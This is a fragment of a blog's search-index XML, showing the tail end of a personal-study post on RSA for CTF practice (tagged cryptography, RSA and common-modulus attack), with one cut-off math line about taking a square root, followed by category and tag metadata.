m>c2^s2）%n&#x3D;m^2.<br>然后对m开平方的可以了</p>]]></content>
    
    
    <categories>
      
      <category>个人学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>密码学</tag>
      
      <tag>RSA</tag>
      
      <tag>共模攻击</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
